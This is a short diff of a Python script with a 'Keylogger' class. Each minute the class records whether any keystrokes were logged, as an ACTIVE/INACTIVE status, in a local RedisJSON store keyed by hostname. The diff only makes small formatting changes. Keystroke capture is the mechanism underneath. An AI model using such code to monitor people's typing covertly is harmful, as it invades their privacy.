@@ -7,17 +7,11 @@ from rejson import Client, Path
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
-redis = Client(host="localhost", port=6379)
+redis = Client(host="localhost", port=6379,decode_responses=True)
 hostname = socket.gethostname()
-
 data = {
     'host': hostname,
-    'status': [
-        {
-            'datetime': datetime.now().__str__(),
-            'activity': "inactive",
-        }
-    ]
+    'status': []
 }
 
 
@@ -60,13 +54,13 @@ class Keylogger:
         if (self.log != ''):
             obj = {
                 "datetime": datetime.now().__str__(),
-                'activity': "active",
+                'activity': "ACTIVE",
             }
             redis.jsonarrappend('test', Path('.status'), obj)
         else:
             obj = {
                 "datetime": datetime.now().__str__(),
-                'activity': "inactive",
+                'activity': "INACTIVE",
             }
             redis.jsonarrappend('test', Path('.status'), obj)
 
